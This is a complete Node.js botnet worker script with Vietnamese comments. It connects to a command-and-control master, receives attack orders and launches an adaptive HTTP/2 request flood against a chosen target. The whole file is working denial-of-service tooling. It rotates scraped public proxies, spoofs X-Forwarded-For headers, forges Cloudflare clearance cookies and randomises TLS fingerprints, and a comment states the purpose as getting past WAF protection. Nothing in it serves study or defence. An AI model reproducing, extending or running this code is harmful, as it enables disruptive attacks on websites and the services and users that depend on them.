// worker.js - Botnet Worker dựa trên v1.74
// node worker.js <master_domain>

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = Infinity;

const cluster = require('cluster');
const crypto = require('crypto');
const http2 = require('http2');
const tls = require('tls');
const url = require('url');
const fs = require('fs');
const os = require('os');
const io = require('socket.io-client');
const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

// ==================== CONFIG ====================
const MASTER_DOMAIN = "192.168.1.2:3000";
const HEALTH_PORT = process.env.PORT || 10000;
const MAX_SESSIONS_PER_WORKER = 100;
const SESSION_REFRESH_INTERVAL = 45000;
const PROXY_TEST_TIMEOUT = 5000;
const PROXY_REFRESH_INTERVAL = 90000;
const RPS_ADAPTIVE = true;
const MAX_RPS_PER_WORKER = 9000;
const MIN_RPS_PER_WORKER = 20;

if (!MASTER_DOMAIN) {
    console.error('[!] Usage: node worker.js <master_domain>');
    console.error('[!] Example: node worker.js master.onrender.com');
    process.exit(1);
}

// ==================== LẤY IP THẬT ====================
function getLocalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                return net.address;
            }
        }
    }
    return 'unknown';
}

// ==================== TẢI PROXY TỰ ĐỘNG ====================
let proxyList = [];
let proxyManager = null;

async function loadProxies() {
    try {
        // Thử đọc file proxy.txt trước
        if (fs.existsSync('./proxy.txt')) {
            proxyList = fs.readFileSync('./proxy.txt', 'utf-8')
                .split('\n')
                .filter(line => line.trim() && line.includes(':'))
                .map(line => line.trim());
            console.log(`[+] Loaded ${proxyList.length} proxies from file`);
            
            // Khởi tạo proxy manager với proxy có sẵn
            if (proxyList.length > 0) {
                proxyManager = new ProxyManager(true, 'http');
                proxyManager.proxies = proxyList;
                await proxyManager.refreshPool();
            }
            return;
        }
        
        console.log('[!] No proxy.txt found, downloading proxies...');
        
        // Tải proxy từ nhiều nguồn
        const sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://www.proxy-list.download/api/v1/get?type=http'
        ];
        
        let allProxies = new Set();
        for (const src of sources) {
            try {
                const res = await axios.get(src, { timeout: 8000 });
                const lines = res.data.split('\n');
                for (const line of lines) {
                    const match = line.match(/(\d+\.\d+\.\d+\.\d+):(\d+)/);
                    if (match) allProxies.add(match[0]);
                }
            } catch (e) {}
        }
        
        proxyList = Array.from(allProxies);
        console.log(`[+] Downloaded ${proxyList.length} proxies`);
        
        // Lưu lại để dùng lần sau
        fs.writeFileSync('./proxy.txt', proxyList.join('\n'));
        
        // Khởi tạo proxy manager
        if (proxyList.length > 0) {
            proxyManager = new ProxyManager(true, 'http');
            proxyManager.proxies = proxyList;
            await proxyManager.refreshPool();
        }
        
    } catch (e) {
        console.log('[!] Error loading proxies, using direct connection');
        proxyList = ['direct'];
    }
}

// ==================== HEALTH SERVER ====================
const healthApp = express();

healthApp.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>🤖 BOTNET WORKER v1.74</title>
            <style>
                body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                .card { background: #1a1a1a; border-radius: 10px; padding: 20px; margin: 10px 0; }
                .status { color: #00ff00; }
                .label { color: #888; }
            </style>
            <meta http-equiv="refresh" content="5">
        </head>
        <body>
            <div class="container">
                <h1>🤖 BOTNET WORKER v1.74</h1>
                <div class="card">
                    <h2>Worker Status</h2>
                    <p><span class="label">IP:</span> <span class="status">${getLocalIP()}</span></p>
                    <p><span class="label">Master:</span> <span class="status">${MASTER_DOMAIN}</span></p>
                    <p><span class="label">Connection:</span> <span class="status">${socket && socket.connected ? '✅ CONNECTED' : '❌ DISCONNECTED'}</span></p>
                    <p><span class="label">Proxies:</span> <span class="status">${proxyManager ? proxyManager.aliveProxies.length : 0}/${proxyList.length}</span></p>
                    <p><span class="label">Uptime:</span> <span class="status">${Math.floor(process.uptime())}s</span></p>
                </div>
            </div>
        </body>
        </html>
    `);
});

healthApp.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        ip: getLocalIP(),
        connected: socket ? socket.connected : false,
        proxies: proxyManager ? proxyManager.aliveProxies.length : 0,
        totalProxies: proxyList.length,
        uptime: process.uptime()
    });
});

healthApp.listen(HEALTH_PORT, '0.0.0.0', () => {
    console.log(`[+] Health server running on port ${HEALTH_PORT}`);
});

// ==================== HTTP Headers đặc biệt để qua mặt WAF ====================
const specialHeaders = {
    'accept-charset': ['utf-8', 'ISO-8859-1', 'windows-1251', ''],
    'x-forwarded-proto': ['https', 'http'],
    'x-forwarded-port': ['443', '80', '8080'],
    'x-forwarded-host': [],
    'x-originating-ip': [],
    'x-remote-ip': [],
    'x-remote-addr': [],
    'x-client-ip': [],
    'x-real-ip': [],
    'forwarded': [],
    'via': [],
    'cdn-loop': ['cloudflare', 'fastly', 'akamai', ''],
    'x-cdn': ['Cloudflare', 'Incapsula', 'Akamai', ''],
    'cf-connecting-ip': [],
    'cf-ipcountry': ['US', 'VN', 'SG', 'JP', 'KR', 'GB', 'DE', 'FR'],
    'cf-ray': [],
    'cf-visitor': ['{"scheme":"https"}', '{"scheme":"http"}'],
    'cf-cache-status': ['HIT', 'MISS', 'DYNAMIC'],
    'cf-request-id': [],
    'x-attack': ['1', '0', ''],
    'x-protected-by': ['Sucuri', 'Cloudflare', 'Akamai', ''],
    'x-hacker': ['true', 'false', ''],
    'x-random': [],
    'x-request-id': [],
    'x-trace-id': [],
    'x-amzn-trace-id': [],
    'x-b3-traceid': [],
    'x-b3-spanid': [],
    'x-b3-parentspanid': [],
    'x-b3-sampled': ['0', '1'],
    'x-datadog-trace-id': [],
    'x-datadog-parent-id': [],
    'x-datadog-sampling-priority': ['0', '1', '2']
};

// Browser fingerprints
const browserFingerprints = {
    webgl: [
        'WebGL Renderer: ANGLE (Intel, Intel(R) UHD Graphics 620 (0x00005917) Direct3D11 vs_5_0 ps_5_0)',
        'WebGL Renderer: ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)',
        'WebGL Renderer: ANGLE (AMD, AMD Radeon RX 6800 XT Direct3D11 vs_5_0 ps_5_0)',
        'WebGL Renderer: Apple GPU (Apple M2 Pro)'
    ],
    canvas: [
        'canvas winding: yes',
        'canvas winding: no',
        'canvas fingerprint: 58c0c9d3b5a0c8d7e4f6a1b2c3d4e5f6'
    ],
    fonts: [
        'Arial,Helvetica,sans-serif',
        'Helvetica,Arial,sans-serif',
        'Arial,sans-serif',
        'Helvetica,sans-serif'
    ]
};

// Timing patterns
const timingPatterns = {
    loadTime: [100, 250, 500, 1000, 2000],
    renderTime: [50, 100, 150, 200, 300],
    interactionDelay: [100, 300, 500, 800, 1200],
    scrollDelay: [0, 100, 200, 500]
};

// TLS extensions
const tlsExtensions = {
    supportedGroups: ['x25519', 'secp256r1', 'secp384r1', 'X25519Kyber'],
    ecPointFormats: ['uncompressed'],
    applicationLayerProtocolNegotiation: ['h2', 'http/1.1'],
    signedCertificateTimestamp: [1],
    extendedMasterSecret: [1],
    padding: [0]
};

// ==================== UA LIST 2025-2026 ====================
const uaList = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; ARM Mac OS X 15_4) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/136.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36 Brave/136.0.0.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36 OPR/121.0.0.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Android 15; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0'
];

const acceptList = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/json, text/plain, */*'
];

const acceptEncodingList = [
    'gzip, deflate, br, zstd',
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate'
];

const acceptLanguageList = [
    'en-US,en;q=0.9,vi;q=0.8',
    'en-GB,en;q=0.9,en-US;q=0.8',
    'vi-VN,vi;q=0.9,en-US;q=0.8',
    'fr-FR,fr;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8'
];

const refererList = [
    'https://www.google.com/',
    'https://www.google.com/search?q=',
    'https://www.facebook.com/',
    'https://www.youtube.com/',
    'https://www.bing.com/',
    'https://www.instagram.com/',
    'https://www.tiktok.com/'
];

const cacheControlList = [
    'no-cache',
    'max-age=0',
    'no-store, no-cache, must-revalidate',
    'private, no-cache, no-store, must-revalidate'
];

const viewportWidthList = [1920, 1536, 1366, 1280, 1440, 1680, 2560];
const viewportHeightList = [1080, 864, 768, 720, 900, 1050, 1440];

// ==================== CIPHER SUITES ====================
const cipherSuitesList = [
    [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305',
        'ECDHE-RSA-CHACHA20-POLY1305'
    ],
    [
        'TLS_AES_128_GCM_SHA256',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-CHACHA20-POLY1305',
        'ECDHE-RSA-CHACHA20-POLY1305',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES256-GCM-SHA384'
    ]
];

const sigalgsList = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384',
    'rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384'
];

const ecdhCurveList = [
    'X25519:secp256r1:secp384r1',
    'X25519Kyber:secp256r1:secp384r1'
];

// ==================== HELPER FUNCTIONS ====================
function random(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomHex(len) {
    return [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
}

function randomDelay() {
    return randomInt(50, 300);
}

function detectPlatform(ua) {
    if (/Android/i.test(ua)) return '"Android"';
    if (/iPhone|iPad/i.test(ua)) return '"iOS"';
    if (/Windows/i.test(ua)) return '"Windows"';
    if (/Mac OS/i.test(ua)) return '"macOS"';
    return '"Linux"';
}

function detectBrowser(ua) {
    if (/Firefox/i.test(ua)) return 'firefox';
    if (/Chrome/i.test(ua) && !/Edg|OPR|Brave/i.test(ua)) return 'chrome';
    if (/Edg/i.test(ua)) return 'edge';
    if (/OPR|Opera/i.test(ua)) return 'opera';
    if (/Brave/i.test(ua)) return 'brave';
    return 'chrome';
}

function extractChromeVersion(ua) {
    const m = ua.match(/Chrome\/(\d+)/i);
    return m ? m[1] : "136";
}

function buildSecChUa(ua) {
    const browser = detectBrowser(ua);
    if (browser === 'chrome' || browser === 'edge' || browser === 'brave' || browser === 'opera') {
        const v = extractChromeVersion(ua);
        return `"Chromium";v="${v}", "Google Chrome";v="${v}", "Not?A_Brand";v="99"`;
    }
    if (browser === 'firefox') {
        return `"Firefox";v="136", "Not?A_Brand";v="99"`;
    }
    return undefined;
}

function generateAcceptLanguage() {
    const main = random(acceptLanguageList);
    if (Math.random() > 0.3) return main;
    const parts = main.split(',');
    if (parts.length > 1) {
        const extra = random(['fr;q=0.3', 'ja;q=0.2', 'zh;q=0.2']);
        return main + ',' + extra;
    }
    return main;
}

function generateCookie() {
    const cookies = [];
    cookies.push(`_ga=GA1.2.${randomInt(100000000, 999999999)}.${Math.floor(Date.now()/1000 - randomInt(0, 86400))}`);
    cookies.push(`_gid=GA1.2.${randomInt(100000000, 999999999)}.${Math.floor(Date.now()/1000 - randomInt(0, 3600))}`);
    if (Math.random() > 0.6) {
        cookies.push(`_fbp=fb.1.${Date.now() - randomInt(0, 604800000)}.${randomInt(1000000000, 9999999999)}`);
    }
    if (Math.random() > 0.7) {
        cookies.push(`cf_clearance=${randomHex(40)}.${randomHex(10)}-${Math.floor(Date.now()/1000 - randomInt(0, 3600))}-0.0.1`);
    }
    if (Math.random() > 0.5) {
        cookies.push(`sessionid=${randomHex(32)}`);
    }
    return cookies.join('; ');
}

function generateHeaders(host, path) {
    const ua = random(uaList);
    const browser = detectBrowser(ua);
    const platform = detectPlatform(ua);
    const secChUa = buildSecChUa(ua);
    const isMobile = /\bMobile\b/i.test(ua) ? '?1' : '?0';
    
    const method = Math.random() > 0.1 ? 'GET' : 'POST';
    
    let finalPath = path;
    if (Math.random() > 0.4) {
        const params = [];
        const numParams = randomInt(1, 4);
        for (let i = 0; i < numParams; i++) {
            params.push(`${randomHex(3)}=${randomInt(1, 9999)}`);
        }
        finalPath += (finalPath.includes('?') ? '&' : '?') + params.join('&');
    }
    
    const headers = {
        ':method': method,
        ':path': finalPath,
        ':scheme': 'https',
        ':authority': host,
        'user-agent': ua,
        'accept': random(acceptList),
        'accept-encoding': random(acceptEncodingList),
        'accept-language': generateAcceptLanguage(),
        'cache-control': random(cacheControlList),
        'referer': random(refererList),
        'sec-ch-ua': secChUa,
        'sec-ch-ua-mobile': isMobile,
        'sec-ch-ua-platform': platform,
        'sec-fetch-dest': random(['document', 'empty', 'iframe', 'image', 'script']),
        'sec-fetch-mode': random(['navigate', 'cors', 'no-cors']),
        'sec-fetch-site': random(['none', 'cross-site', 'same-origin', 'same-site']),
        'upgrade-insecure-requests': '1',
        'x-forwarded-for': `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`,
        'x-forwarded-proto': 'https'
    };
    
    if (method === 'GET') {
        headers['sec-fetch-user'] = '?1';
    }
    
    if (Math.random() > 0.6) {
        headers['cookie'] = generateCookie();
    }
    
    if (browser === 'firefox') {
        headers['te'] = 'trailers';
    }
    
    if (browser === 'chrome' || browser === 'edge' || browser === 'brave' || browser === 'opera') {
        headers['viewport-width'] = random(viewportWidthList).toString();
        headers['viewport-height'] = random(viewportHeightList).toString();
        headers['device-memory'] = random(['4', '8', '16']);
        headers['dpr'] = (Math.random() * 2 + 1).toFixed(1);
    }
    
    if (browser === 'chrome' || browser === 'edge') {
        headers['priority'] = random(['u=0, i', 'u=0', 'u=0, i, f']);
    }
    
    Object.keys(headers).forEach(key => headers[key] === undefined && delete headers[key]);
    
    return headers;
}

// ==================== TLS CONFIG ====================
function getRandomTlsConfig() {
    const cipherSuite = random(cipherSuitesList).join(':');
    const sigalgs = random(sigalgsList);
    const ecdhCurve = random(ecdhCurveList);
    
    const secureOptions = 
        crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSL_OP_NO_TLSv1 |
        crypto.constants.SSL_OP_NO_TLSv1_1 |
        crypto.constants.SSL_OP_NO_COMPRESSION;
    
    return {
        ciphers: cipherSuite,
        sigalgs: sigalgs,
        ecdhCurve: ecdhCurve,
        secureOptions: secureOptions,
        honorCipherOrder: true
    };
}

// ==================== PROXY MANAGER ====================
class ProxyManager {
    constructor(useProxy, proxyType = 'http') {
        this.useProxy = useProxy;
        this.proxyType = proxyType;
        this.proxies = [];
        this.aliveProxies = [];
        this.currentIndex = 0;
        this.lock = false;
        this.lastRefresh = 0;
    }
    
    async testProxy(proxy) {
        try {
            const agent = new HttpsProxyAgent(`http://${proxy}`);
            const start = Date.now();
            await axios.get('https://httpbin.org/ip', {
                httpsAgent: agent,
                timeout: 5000
            });
            const latency = Date.now() - start;
            return { alive: true, latency };
        } catch (e) {
            return { alive: false, latency: Infinity };
        }
    }
    
    async refreshPool() {
        if (this.lock || !this.useProxy) return;
        this.lock = true;
        
        try {
            const sample = this.proxies.sort(() => 0.5 - Math.random()).slice(0, 30);
            const results = [];
            
            for (const proxy of sample) {
                const result = await this.testProxy(proxy);
                if (result.alive) {
                    results.push({ proxy, latency: result.latency });
                }
            }
            
            results.sort((a, b) => a.latency - b.latency);
            this.aliveProxies = results.map(r => r.proxy);
            console.log(`[+] Proxy manager: ${this.aliveProxies.length} alive proxies`);
            
        } catch (e) {}
        
        this.lock = false;
    }
    
    getProxy() {
        if (!this.useProxy || this.aliveProxies.length === 0) return null;
        const proxy = this.aliveProxies[this.currentIndex % this.aliveProxies.length];
        this.currentIndex++;
        return proxy;
    }
}

// ==================== SESSION POOL ====================
class SessionPool {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.parsed = new URL(targetUrl);
        this.sessions = [];
        this.stats = { total: 0, success: 0, failed: 0, blocked: 0 };
        this.sessionErrors = new Map();
        this.running = true;
        
        this.initSessions();
        setInterval(() => this.cleanupSessions(), SESSION_REFRESH_INTERVAL);
    }
    
    async createSession() {
        const proxy = proxyManager ? proxyManager.getProxy() : null;
        const tlsConfig = getRandomTlsConfig();
        
        const tlsOpts = {
            ...tlsConfig,
            ALPNProtocols: ['h2', 'http/1.1'],
            servername: this.parsed.hostname,
            rejectUnauthorized: false
        };
        
        return new Promise((resolve) => {
            try {
                const client = http2.connect(this.parsed.origin, {
                    createConnection: () => {
                        if (proxy) {
                            const agent = new HttpsProxyAgent(`http://${proxy}`);
                            const socket = agent.createConnection({ host: this.parsed.hostname, port: 443 });
                            return tls.connect({ socket, ...tlsOpts });
                        } else {
                            return tls.connect(443, this.parsed.hostname, tlsOpts);
                        }
                    },
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        enablePush: false
                    }
                });
                
                client.alive = true;
                client.errorCount = 0;
                client.created = Date.now();
                
                client.on('connect', () => resolve(client));
                client.on('error', () => {
                    client.alive = false;
                    client.errorCount++;
                });
                client.on('close', () => { client.alive = false; });
                
                setTimeout(() => {
                    if (!client.alive) {
                        client.destroy();
                        resolve(null);
                    }
                }, 10000);
                
            } catch (e) {
                resolve(null);
            }
        });
    }
    
    async initSessions() {
        for (let i = 0; i < MAX_SESSIONS_PER_WORKER; i++) {
            if (!this.running) break;
            const sess = await this.createSession();
            if (sess) this.sessions.push(sess);
            await new Promise(r => setTimeout(r, randomInt(100, 500)));
        }
        console.log(`[+] Session pool: ${this.sessions.length}/${MAX_SESSIONS_PER_WORKER} sessions ready`);
    }
    
    async cleanupSessions() {
        if (!this.running) return;
        const now = Date.now();
        this.sessions = this.sessions.filter(s => {
            if (!s.alive) return false;
            if (s.errorCount > 3) return false;
            if (now - s.created > 300000) return false;
            return true;
        });
        
        const need = MAX_SESSIONS_PER_WORKER - this.sessions.length;
        for (let i = 0; i < need; i++) {
            if (!this.running) break;
            const sess = await this.createSession();
            if (sess) this.sessions.push(sess);
            await new Promise(r => setTimeout(r, 100));
        }
    }
    
    getSession() {
        if (this.sessions.length === 0) return null;
        const healthy = this.sessions.filter(s => s.errorCount < 2);
        if (healthy.length > 0) {
            return healthy[Math.floor(Math.random() * healthy.length)];
        }
        return this.sessions[Math.floor(Math.random() * this.sessions.length)];
    }
    
    updateStats(type) { this.stats[type]++; }
    getStats() { return { ...this.stats }; }
    resetStats() { this.stats = { total: 0, success: 0, failed: 0, blocked: 0 }; }
    stop() { this.running = false; }
}

// ==================== ATTACK ENGINE ====================
class AttackEngine {
    constructor(target, rate, threads) {
        this.target = target;
        this.rate = rate;
        this.threads = threads;
        this.parsed = new URL(target);
        this.running = true;
        this.sessionPools = [];
        this.statsInterval = null;
    }
    
    async start() {
        console.log(`[+] Attack engine starting for ${this.target} with ${this.threads} threads`);
        
        // Tạo session pools cho mỗi thread
        for (let i = 0; i < this.threads; i++) {
            const pool = new SessionPool(this.target);
            this.sessionPools.push(pool);
            await new Promise(r => setTimeout(r, 1000));
        }
        
        // Gửi stats mỗi 2 giây
        this.statsInterval = setInterval(() => {
            if (!this.running) return;
            
            let total = 0, success = 0, failed = 0, blocked = 0;
            this.sessionPools.forEach(pool => {
                const stats = pool.getStats();
                total += stats.total;
                success += stats.success;
                failed += stats.failed;
                blocked += stats.blocked;
                pool.resetStats();
            });
            
            if (socket && socket.connected && total > 0) {
                socket.emit('stats', { 
                    count: total,
                    success,
                    failed,
                    blocked
                });
            }
        }, 2000);
        
        // Bắt đầu flood
        this.sessionPools.forEach(pool => {
            this.runPool(pool);
        });
    }
    
    async runPool(pool) {
        let currentRps = this.rate;
        let successCount = 0;
        let failCount = 0;
        let lastAdjust = Date.now();
        
        const requestQueue = [];
        let processing = false;
        
        const processQueue = async () => {
            if (processing) return;
            processing = true;
            
            while (requestQueue.length > 0 && this.running) {
                const session = requestQueue.shift();
                if (!session) continue;
                
                const headers = generateHeaders(this.parsed.hostname, this.parsed.pathname);
                
                try {
                    const req = session.request(headers);
                    let responded = false;
                    
                    req.on('response', (res) => {
                        responded = true;
                        pool.updateStats('total');
                        
                        if (res[':status'] === 200) {
                            pool.updateStats('success');
                            successCount++;
                        } else if ([403, 429, 503, 520].includes(res[':status'])) {
                            pool.updateStats('blocked');
                        } else {
                            pool.updateStats('failed');
                            failCount++;
                        }
                    });
                    
                    req.on('error', () => {
                        if (!responded) {
                            pool.updateStats('total');
                            pool.updateStats('failed');
                            failCount++;
                            session.errorCount++;
                        }
                    });
                    
                    req.end();
                    await new Promise(r => setTimeout(r, randomDelay() / 10));
                    
                } catch (e) {
                    pool.updateStats('total');
                    pool.updateStats('failed');
                    failCount++;
                    session.errorCount++;
                }
            }
            
            processing = false;
        };
        
        const addRequests = () => {
            if (!this.running) return;
            const session = pool.getSession();
            if (!session) return;
            
            const batchSize = Math.ceil(currentRps / 10);
            for (let i = 0; i < batchSize; i++) {
                requestQueue.push(session);
            }
            processQueue();
        };
        
        const interval = setInterval(addRequests, 100 + randomInt(-20, 20));
        
        // Adaptive RPS
        const adjustInterval = setInterval(() => {
            if (!this.running || !RPS_ADAPTIVE) return;
            
            const now = Date.now();
            if (now - lastAdjust < 10000) return;
            
            const total = successCount + failCount;
            if (total < 50) return;
            
            const successRate = successCount / total;
            
            if (successRate < 0.3 && currentRps > MIN_RPS_PER_WORKER) {
                currentRps = Math.max(MIN_RPS_PER_WORKER, Math.floor(currentRps * 0.8));
            } else if (successRate > 0.7 && currentRps < MAX_RPS_PER_WORKER) {
                currentRps = Math.min(MAX_RPS_PER_WORKER, Math.floor(currentRps * 1.2));
            }
            
            successCount = 0;
            failCount = 0;
            lastAdjust = now;
        }, 5000);
        
        // Cleanup khi dừng
        const cleanup = () => {
            clearInterval(interval);
            clearInterval(adjustInterval);
            pool.stop();
        };
        
        // Lưu cleanup function
        if (!this.cleanups) this.cleanups = [];
        this.cleanups.push(cleanup);
    }
    
    stop() {
        console.log('[+] Stopping attack engine');
        this.running = false;
        if (this.statsInterval) clearInterval(this.statsInterval);
        if (this.cleanups) {
            this.cleanups.forEach(cleanup => cleanup());
        }
        this.sessionPools.forEach(pool => pool.stop());
    }
}

// ==================== KẾT NỐI MASTER ====================
const masterUrl = `https://${MASTER_DOMAIN}`;
const socket = io(masterUrl, {
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    transports: ['websocket', 'polling']
});

let currentAttack = null;

socket.on('connect', async () => {
    console.log(`[+] Connected to master at ${MASTER_DOMAIN}`);
    
    // Load proxy trước khi đăng ký
    await loadProxies();
    
    socket.emit('register', { 
        ip: getLocalIP(),
        proxies: proxyManager ? proxyManager.aliveProxies.length : 0,
        totalProxies: proxyList.length
    });
});

socket.on('registered', (data) => {
    console.log(`[+] Registered with master. Total workers: ${data.workers}`);
});

socket.on('ping', () => {
    socket.emit('pong');
});

socket.on('attack', async (data) => {
    console.log(`\n[+] ATTACK COMMAND RECEIVED`);
    console.log(`   Target: ${data.target}`);
    console.log(`   Time: ${data.time}s`);
    console.log(`   Rate: ${data.rate}`);
    console.log(`   Threads: ${data.threads}`);
    
    // Dừng attack cũ nếu có
    if (currentAttack) {
        currentAttack.stop();
        currentAttack = null;
    }
    
    // Tạo attack engine mới
    const engine = new AttackEngine(data.target, data.rate, data.threads);
    currentAttack = engine;
    
    // Bắt đầu attack
    await engine.start();
    
    // Tự động dừng sau thời gian
    setTimeout(() => {
        if (currentAttack === engine) {
            console.log(`[+] Attack time finished`);
            engine.stop();
            currentAttack = null;
            process.exit(0);
        }
    }, data.time * 1000);
});

socket.on('stop', () => {
    console.log(`[+] STOP command received`);
    if (currentAttack) {
        currentAttack.stop();
        currentAttack = null;
    }
    process.exit(0);
});

socket.on('disconnect', (reason) => {
    console.log(`[-] Disconnected from master: ${reason}`);
    setTimeout(() => process.exit(0), 5000);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[!] Received SIGTERM, shutting down...');
    if (currentAttack) currentAttack.stop();
    process.exit(0);
});